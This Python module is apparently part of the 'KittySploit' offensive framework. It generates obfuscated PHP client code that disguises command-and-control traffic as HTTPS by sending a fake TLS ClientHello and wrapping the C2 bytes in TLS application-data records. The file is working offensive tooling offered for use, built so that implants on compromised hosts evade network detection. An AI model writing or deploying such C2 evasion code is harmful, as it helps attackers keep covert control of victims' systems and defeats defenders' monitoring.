#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional

from kittysploit import Transform
from modules.transforms.python.protocol.https_mimic import (
    CLIENT_HELLO_BYTES,
    Module as PythonHttpsTransform,
)


class Module(Transform, PythonHttpsTransform):
    """PHP HTTPS/TLS record mimic transform."""

    SUPPORTED_CLIENT_LANGUAGES = ["php"]

    __info__ = {
        "name": "PHP HTTPS Mimic Transform",
        "description": "Sends a fake TLS ClientHello then wraps C2 bytes in TLS Application Data records.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "php":
            return None
        hello_hex = CLIENT_HELLO_BYTES.hex()
        return (
            f"$xf_client_hello=hex2bin('{hello_hex}');$xf_buf='';$xf_first=true;"
            "function _xf_encode($d){global $xf_client_hello,$xf_first;if($d===''){return $d;}$out='';"
            "if($xf_first){$out.=$xf_client_hello;$xf_first=false;}"
            "$i=0;$l=strlen($d);while($i<$l){$c=substr($d,$i,16384);$i+=strlen($c);$n=strlen($c);$out.=chr(0x17).chr(0x03).chr(0x03).chr(($n>>8)&255).chr($n&255).$c;}return $out;}"
            "function _xf_decode($d){global $xf_buf;$xf_buf.=$d;$out='';"
            "while(strlen($xf_buf)>=5){$rt=ord($xf_buf[0]);$ln=(ord($xf_buf[3])<<8)|ord($xf_buf[4]);"
            "if($ln>16384){$xf_buf=substr($xf_buf,1);continue;}if(strlen($xf_buf)<5+$ln){break;}"
            "if($rt===0x17){$out.=substr($xf_buf,5,$ln);}$xf_buf=substr($xf_buf,5+$ln);}return $out;}"
        )
